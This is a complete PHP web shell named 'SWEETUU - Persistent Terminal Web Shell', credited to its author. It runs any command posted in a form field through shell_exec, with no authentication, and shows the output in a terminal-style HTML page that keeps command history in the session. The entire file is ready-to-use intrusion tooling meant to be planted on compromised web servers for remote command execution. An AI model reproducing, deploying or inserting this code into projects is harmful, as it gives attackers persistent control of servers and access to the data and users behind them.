<?php
/*
    =======================================================================================
    |   Name   : SWEETUU - Persistent Terminal Web Shell by CSPSHIVAM                   |
    |   Owner  : CSPSHIVAM                                                               |
    |   Social : @iamshivamz                                                             |
    =======================================================================================
*/

// Initialize a session to store command history
session_start();
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = "Welcome to SWEETUU Shell. Type a command and hit RUN.\n";
}

// Handle command execution
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["cmd"])) {
    $cmd = $_POST["cmd"];
    $output = shell_exec($cmd . " 2>&1"); // Execute command
    $_SESSION['history'] .= "\n> " . $cmd . "\n" . $output; // Append command and output to session
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SWEETUU - Persistent Terminal Web Shell</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: Consolas, monospace;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        #terminal {
            background-color: #111;
            color: #0f0;
            width: 80%;
            height: 60%;
            padding: 10px;
            border: 2px solid #0f0;
            border-radius: 5px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        #commandInput {
            width: 80%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border: 1px solid #0f0;
            background-color: #222;
            color: #0f0;
        }
        button {
            padding: 10px 20px;
            background-color: #0f0;
            border: none;
            color: #000;
            font-weight: bold;
            border-radius: 5px;
            margin-top: 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #00f700;
        }
    </style>
</head>
<body>
    <h1>SWEETUU - Persistent Terminal Web Shell</h1>
    <div id="terminal">
        <?php
        // Display the command history
        echo nl2br($_SESSION['history']);
        ?>
    </div>
    <form method="POST" style="width: 100%; text-align: center;" id="commandForm">
        <input type="text" id="commandInput" name="cmd" placeholder="Enter command here" autocomplete="off">
        <button type="submit">RUN</button>
    </form>

    <script>
        // Keep the input field focused after form submission
        document.getElementById('commandForm').addEventListener('submit', function(event) {
            setTimeout(function() {
                document.getElementById('commandInput').focus();
            }, 10);
        });

        // Automatically scroll the terminal div to the bottom
        const terminal = document.getElementById('terminal');
        terminal.scrollTop = terminal.scrollHeight;
    </script>
</body>
</html>
